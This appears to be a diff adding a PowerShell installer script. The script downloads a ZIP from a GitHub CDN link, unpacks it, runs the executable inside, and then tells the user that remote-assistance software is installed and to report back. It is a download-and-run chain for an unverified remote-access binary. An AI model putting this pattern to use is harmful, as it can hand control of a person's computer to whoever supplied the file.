@@ -1,0 +1,36 @@
+# 设置文件路径
+$zipUrl = "https://cdn.jsdelivr.net/gh/GHFXJ1680/a@main/YC_WIN.zip"
+$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "YC_WIN.zip")
+$tempFolderPath = [System.IO.Path]::GetTempPath()
+$extractedFolderPath = [System.IO.Path]::Combine($tempFolderPath, "YC_WIN")
+
+# 下载ZIP文件到桌面
+Write-Host "Downloading file..."
+Invoke-WebRequest -Uri $zipUrl -OutFile $desktopPath
+
+# 创建临时文件夹
+if (-not (Test-Path $extractedFolderPath)) {
+    New-Item -Path $extractedFolderPath -ItemType Directory | Out-Null
+}
+
+# 解压缩文件到临时文件夹
+Write-Host "Extracting file..."
+Add-Type -AssemblyName "System.IO.Compression.FileSystem"
+[System.IO.Compression.ZipFile]::ExtractToDirectory($desktopPath, $extractedFolderPath)
+
+# 查找解压后的可执行文件
+$extractedFile = Get-ChildItem -Path $extractedFolderPath -Filter *.exe | Select-Object -First 1
+
+if ($extractedFile) {
+    # 运行解压后的文件
+    Write-Host "Running the executable..."
+    Start-Process -FilePath $extractedFile.FullName -Wait
+
+    # 当文件运行完毕后，弹出消息框
+    [System.Windows.Forms.MessageBox]::Show("远程协助软件YC已经安装完成，请注意桌面右下角的小头像,显示绿点后通知我", "提示", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
+} else {
+    Write-Host "No executable file found in extracted folder."
+}
+
+# 清理下载的ZIP文件
+Remove-Item -Path $desktopPath -Force
